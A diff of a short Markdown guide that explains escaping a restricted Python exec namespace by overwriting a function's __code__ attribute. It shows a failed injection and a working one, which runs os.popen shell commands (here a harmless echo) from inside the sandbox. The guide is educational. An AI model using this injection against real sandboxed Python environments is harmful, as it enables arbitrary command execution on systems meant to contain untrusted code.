@@ -1,7 +1,8 @@
-*2022-05-15*
-
-#guide 
-
+---
+tags:
+  - guide
+date: 2022-05-15*
+---
 > [!Abstract] Introduction
 >The `__code__` attribute of a Python function can be overwritten, allowing us to break out of a constrained namespace and use an elevated one.
 
@@ -10,10 +11,10 @@
 We can view all the attributes of a Python object using `print(func.__dir__())`. If we run this on the `print` function object for example, be able to see its `__code__` attribute.
 
 ```python
-Python 3.10.4 (main, Mar 23 2022, 23:05:40) [GCC 11.2.0] on linux  
-Type "help", "copyright", "credits" or "license" for more information.  
->>> print(print.__dir__())  
-['__repr__', '__hash__', '__call__', '__getattribute__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__reduce__', '__module__', '__doc__', '__name__', '__qualname__', '__self__', '__text_signature__', '__new__',  
+Python 3.10.4 (main, Mar 23 2022, 23:05:40) [GCC 11.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> print(print.__dir__())
+['__repr__', '__hash__', '__call__', '__getattribute__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__reduce__', '__module__', '__doc__', '__name__', '__qualname__', '__self__', '__text_signature__', '__new__',
 '__str__', '__setattr__', '__delattr__', '__init__', '__reduce_ex__', '__subclasshook__', '__init_subclass__', '__format__', '__sizeof__', '__dir__', '__class__']
 ```
 
@@ -45,14 +46,14 @@ We can use this property to escalate to a namespace with more functions availabl
 
 #### Failed exploit
 ```python
-import os 
+import os
 
 def new_print(x):
 	print(f"new print {x}")
 
 builtins = {
 	"print": new_print
-}  
+}
 
 injection = "print(os.popen('whoami').read())"
 
@@ -74,14 +75,14 @@ Now, lets try the same code with a different injection. This time we're going to
 
 #### Working exploit
 ```python
-import os 
+import os
 
 def new_print(x):
 	print(f"new print {x}")
 
 builtins = {
 	"print": new_print
-}  
+}
 
 injection = "print.__code__ = (lambda: print(os.popen('echo EXPLOITED!').read())).__code__; print()"
 
@@ -94,7 +95,7 @@ EXPLOITED!
 ```
 
 > [!Success]
-> The `print` function's code is being overwritten with that of our own lambda, but instead of using the constrained namespace of the `exec`, it's using the namespace of `new_print` which has access to the `os` module and all the default Python built-ins. 
+> The `print` function's code is being overwritten with that of our own lambda, but instead of using the constrained namespace of the `exec`, it's using the namespace of `new_print` which has access to the `os` module and all the default Python built-ins.
 
 With this change, `print(os.popen('echo EXPLOITED!').read())` is running as if it's not in the constrained namespace.
 
@@ -102,5 +103,3 @@ With this change, `print(os.popen('echo EXPLOITED!').read())` is running as if i
 
 # References
 * https://stackoverflow.com/questions/6886493/get-all-object-attributes-in-python
-
----
